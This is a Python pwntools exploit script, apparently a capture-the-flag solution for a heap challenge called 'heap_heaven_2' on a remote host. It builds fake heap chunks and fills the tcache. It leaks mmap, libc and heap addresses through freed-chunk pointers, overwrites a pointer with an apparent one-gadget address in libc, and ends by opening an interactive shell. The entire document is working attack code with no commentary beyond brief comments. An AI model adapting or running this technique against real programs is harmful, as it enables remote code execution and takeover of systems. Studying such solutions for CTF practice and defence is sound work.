from pwn import *

#p = process('./heap_heaven_2', env={'LD_PRELOAD': './libc.so.6'})
p = remote('arcade.fluxfingers.net', 1809)

def eat_menu():
    p.recvuntil('exit\n')

def write(stuff, offset):
    p.sendline('1')
    p.recvline()
    p.sendline(str(len(stuff)))
    p.recvline()
    p.sendline(str(offset))
    p.send(stuff)
    eat_menu()

def free(offset):
    p.sendline('3')
    p.recvline()
    p.sendline(str(offset))
    eat_menu()

def leak(offset):
    p.sendline('4')
    p.recvline()
    p.sendline(str(offset))
    res = p.recvuntil('Please')[:-7]
    eat_menu()

    return res

eat_menu()

write(p64(0) + p64(0x101) + 'A'*0xf0, 0)
write(p64(0) + p64(0x101) + 'B'*0xf0, 0x100)
stuff = '/bin/sh\x00'
stuff += 'C' * (0xf0 - len(stuff))
write(p64(0) + p64(0x101) + stuff, 0x200)

# (nearly) fill up tcache
for _ in range(6):
    free(0x10)

# last tcache allocation, creates ptr to offset 0x10
free(0x110)

mmap_ptr = leak(0x110)
mmap_ptr += '\x00' * (8-len(mmap_ptr))
mmap_base = u64(mmap_ptr) - 0x10
print hex(mmap_base)

# normal free, gives us main_arena+96 ptr
free(0x10)

# overwrite first byte of main_arena+96 (a NULL) so we can leak the addr
write('\x10', 0x10)

libc_ptr = leak(0x110)
libc_ptr += '\x00' * (8-len(libc_ptr))
libc_thing = u64(libc_ptr) - 0x10
libc = ELF('./libc.so.6')
libc.address = libc_thing - (libc.symbols['main_arena'] + 96)
print hex(libc.address)

write(p64(libc.symbols['main_arena'] + 96), 0x10)
real_heap_ptr = leak(0x10)
real_heap_ptr += '\x00' * (8-len(real_heap_ptr))
heap_base = u64(real_heap_ptr) & ~0xfff
print hex(heap_base)

write(p64(0) + p64(0x21) + 'A'*0x10, 0x400)
free(0x410)

write(p64(libc.address + 0xE75F0), 0x418)

# 0x260 is offset from heap base to the state struct
p.sendline('3')
p.recvline()
p.sendline(str(heap_base - mmap_base + 0x260))

p.interactive()
